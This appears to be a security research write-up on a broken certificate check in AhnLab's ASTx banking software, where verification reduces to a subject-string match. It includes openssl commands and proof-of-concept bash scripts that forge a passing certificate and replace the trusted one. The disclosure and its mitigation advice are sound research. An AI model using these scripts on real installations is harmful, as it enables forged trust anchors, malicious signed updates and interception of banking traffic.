# ASTx Certificate Verification Bypass

## Overview

ASTx implements a fundamentally broken certificate verification system that provides zero cryptographic security while appearing to perform proper certificate validation. The `verifyCertFile()` function demonstrates classic "security theater" - it looks like legitimate certificate verification but can be trivially bypassed.

## Broken Verification Implementation

### Function: `verifyCertFile(char *cert_path, char *expected_string)`

**Purpose**: Supposedly validates X.509 certificates for trust establishment  
**Reality**: Performs only basic file parsing and string matching

### Verification Steps:
```c
// 1. Load certificate from file
FILE *stream = fopen(cert_path, "r");
X509 *cert = PEM_read_X509(stream, NULL, NULL, NULL);

// 2. Extract subject and issuer 
X509_NAME *subject = X509_get_subject_name(cert);
X509_NAME *issuer = X509_get_issuer_name(cert);

// 3. Check if self-signed (subject == issuer)
if (X509_NAME_cmp(issuer, subject) == 0) {
    // 4. Convert subject to string
    char *subject_str = X509_NAME_oneline(subject, NULL, 0);
    
    // 5. Simple string search - THIS IS THE ENTIRE "VERIFICATION"
    if (strstr(subject_str, expected_string) != NULL) {
        return 1;  // "VERIFIED"
    }
}
```

## What This "Verification" Actually Checks:

✅ **File exists and is readable**  
✅ **Valid X.509 certificate format**  
✅ **Certificate is self-signed** (Subject == Issuer)  
✅ **Subject field contains expected string**  

## What This "Verification" Does NOT Check:

❌ **Cryptographic signature validity**  
❌ **Certificate chain of trust**  
❌ **Certificate expiration dates**  
❌ **Certificate revocation status**  
❌ **Key usage restrictions**  
❌ **Critical extensions compliance**  
❌ **Any actual cryptographic properties**  

## Real-World Usage Example

```c
// Actual call from ASTx code
local_495 = verifyCertFile("/opt/AhnLab/ASTx/ConfigFile/ca-certificate2.crt", "ASTxRoot2");
```

### Target Certificate Analysis:
- **File**: `ca-certificate2.crt`
- **Subject**: `O=ASTxRoot2`
- **Issuer**: `O=ASTxRoot2` (self-signed)
- **Expected String**: `"ASTxRoot2"`
- **Verification Result**: PASS (subject contains "ASTxRoot2")

## Complete Attack Vectors

### 1. Certificate Replacement Attack
**Prerequisites**: File system write access to `/opt/AhnLab/ASTx/ConfigFile/`

**Attack Steps**:
1. Generate malicious self-signed certificate with required string:
```bash
openssl req -x509 -newkey rsa:2048 -keyout attacker.key -out malicious.crt -days 365 -nodes \
  -subj "/CN=attacker.evil.com/O=ASTxRoot2"
```

2. Replace legitimate certificate:
```bash
cp malicious.crt /opt/AhnLab/ASTx/ConfigFile/ca-certificate2.crt
```

3. Certificate passes "verification" and establishes attacker's trust anchor

### 2. Man-in-the-Middle Certificate Creation
**Prerequisites**: Network interception capability

**Attack Steps**:
1. Create certificate matching ASTx's expectations:
```bash
# Any of these would pass verification:
openssl req -x509 -newkey rsa:2048 -keyout mitm1.key -out mitm1.crt -days 365 -nodes \
  -subj "/O=ASTxRoot2"

openssl req -x509 -newkey rsa:2048 -keyout mitm2.key -out mitm2.crt -days 365 -nodes \
  -subj "/CN=fake-ahnlab.com/O=ASTxRoot2/C=KR"

openssl req -x509 -newkey rsa:2048 -keyout mitm3.key -out mitm3.crt -days 365 -nodes \
  -subj "/CN=evil.attacker.com/O=Contains_ASTxRoot2_in_subject"
```

2. Use certificate in TLS interception or code signing attacks

### 3. Trust Anchor Poisoning
**Prerequisites**: Understanding of how certificate is used in ASTx crypto operations

**Attack Flow**:
1. Create certificate with attacker-controlled key pair
2. Ensure subject contains required string for verification bypass
3. Replace or provide alternative certificate to establish malicious trust anchor
4. Sign malicious code/configs with attacker's private key
5. ASTx accepts signatures as "valid" due to compromised trust relationship

## File System Issue Discovery

### Docker/Container Environment Problem:
```
[Error][verifyCertFile] /opt/AhnLab/ASTx/ConfigFile/ca-certificate2.crt could not open
[Error][registerCert] certificate is not valid.
[Error][registerCert] failed to CCertUtil::registerCert
```

**Root Cause**: Certificate file not accessible in containerized environment
- File missing from mounted filesystem
- Incorrect path mapping in container
- Permission issues preventing file access

**Security Implication**: When certificate loading fails, determine fallback behavior:
- Does ASTx continue operation without certificate validation?
- Does it fall back to less secure verification methods?
- Are there alternative trust anchors or bypass mechanisms?

## Exploitation Scenarios

### Scenario 1: Local Privilege Escalation
1. **Attacker has file write access** to ASTx directory
2. **Replace certificate** with attacker-controlled version containing "ASTxRoot2"
3. **ASTx accepts malicious certificate** due to broken verification
4. **Sign malicious configurations** or code updates with attacker's key
5. **ASTx trusts and executes** attacker's signed content

### Scenario 2: Supply Chain Attack
1. **Compromise certificate distribution** mechanism
2. **Inject malicious certificates** into update packages
3. **Certificates pass verification** due to string-matching weakness
4. **Establish persistent trust relationship** with attacker infrastructure
5. **Sign future malicious updates** using compromised trust anchor

### Scenario 3: Network-Level Trust Bypass
1. **Intercept certificate-related network communications**
2. **Present attacker certificate** containing required subject string
3. **ASTx accepts certificate** without cryptographic validation
4. **Establish encrypted channel** under attacker control
5. **Manipulate all subsequent communications** through compromised trust

## Security Impact Assessment

### Severity: HIGH
- **Trust Establishment Bypass**: Complete circumvention of certificate validation
- **Cryptographic Trust Failure**: No actual cryptographic verification performed
- **Persistent Compromise**: Malicious certificates remain trusted until replaced
- **Infrastructure Impact**: Affects core security architecture of banking software
- **Attack Surface**: Any component relying on this certificate verification

### Attack Characteristics:
- **Trivial Bypass**: Simple string manipulation defeats entire verification
- **No Specialized Tools**: Standard OpenSSL commands sufficient for attack
- **Persistent**: Malicious certificates remain "valid" indefinitely
- **Stealthy**: Appears as legitimate certificate to verification function
- **Scalable**: Same technique works across all ASTx installations

## Comparison with Industry Standards

### Proper Certificate Verification Should Include:
1. **Signature Chain Validation**: Verify each certificate in chain
2. **Root CA Trust Verification**: Check against trusted certificate authorities
3. **Expiration Date Validation**: Ensure certificates are within valid time period
4. **Revocation Checking**: Verify certificates haven't been revoked (CRL/OCSP)
5. **Key Usage Validation**: Ensure certificate is authorized for intended purpose
6. **Hostname/Subject Validation**: Verify certificate matches expected identity
7. **Critical Extensions Processing**: Handle certificate constraints and extensions

### ASTx Implementation:
1. ❌ **No signature validation**
2. ❌ **No trust chain verification** 
3. ❌ **No expiration checking**
4. ❌ **No revocation checking**
5. ❌ **No key usage validation**
6. ⚠️ **Basic subject string matching only**
7. ❌ **No extensions processing**

## Affected Components

**Direct Impact**:
- `verifyCertFile()` function - Primary vulnerability
- `registerCert()` function - Caller of broken verification
- Certificate-based trust establishment throughout ASTx

**Potential Downstream Impact**:
- TLS/SSL connection validation
- Code signing verification
- Configuration file signature checking
- Update mechanism trust validation
- Inter-component authentication

## Mitigation Recommendations

### Immediate Fixes:
1. **Implement proper signature verification** using OpenSSL verification APIs
2. **Add certificate chain validation** against trusted root CAs
3. **Include expiration date checking** in verification logic
4. **Validate certificate key usage** for intended purpose

### Systematic Improvements:
1. **Use standard OpenSSL verification functions**: `X509_verify_cert()`
2. **Implement certificate store management**: Proper CA certificate handling
3. **Add revocation checking**: CRL or OCSP validation
4. **Security code review**: Audit all certificate-related functionality
5. **Adopt established crypto libraries**: Avoid custom cryptographic implementations

## Research Significance

This vulnerability demonstrates **fundamental misunderstanding of cryptographic principles** in Korean banking software development:

1. **Security Theater**: Appearance of security without actual protection
2. **Crypto Cargo Culting**: Using cryptographic formats without understanding security properties
3. **Trust Model Failure**: Complete breakdown of certificate-based trust architecture
4. **Industry-Wide Pattern**: Likely representative of broader crypto implementation issues

## Proof of Concept

### Create Bypassing Certificate:
```bash
#!/bin/bash
# Create certificate that bypasses ASTx verification

# Generate malicious certificate with required subject string
openssl req -x509 -newkey rsa:2048 -keyout bypass.key -out bypass.crt \
  -days 3650 -nodes -batch \
  -subj "/CN=EVIL CERTIFICATE/O=ASTxRoot2/C=XX/ST=Malicious/L=Attacker"

# Verify it contains required string
echo "Certificate subject:"
openssl x509 -in bypass.crt -noout -subject

echo -e "\nThis certificate will pass ASTx verification!"
echo "String search for 'ASTxRoot2':"
openssl x509 -in bypass.crt -noout -subject | grep -o "ASTxRoot2"
```

### File Replacement Attack:
```bash
#!/bin/bash
# Replace legitimate ASTx certificate with malicious version

# Backup original
cp /opt/AhnLab/ASTx/ConfigFile/ca-certificate2.crt /tmp/original.crt.backup

# Deploy malicious certificate  
cp bypass.crt /opt/AhnLab/ASTx/ConfigFile/ca-certificate2.crt

echo "Malicious certificate deployed. ASTx will accept it as valid."
```

## Conclusion

The `verifyCertFile()` function represents a **catastrophic failure in cryptographic implementation** that completely defeats the purpose of certificate-based trust. This vulnerability allows trivial bypass of certificate validation through simple string manipulation, enabling various attack scenarios from local privilege escalation to supply chain compromise.

This finding, combined with the other cryptographic vulnerabilities discovered in ASTx, demonstrates a **systematic pattern of insecure crypto implementation** in Korean banking software that poses significant risks to financial infrastructure security.
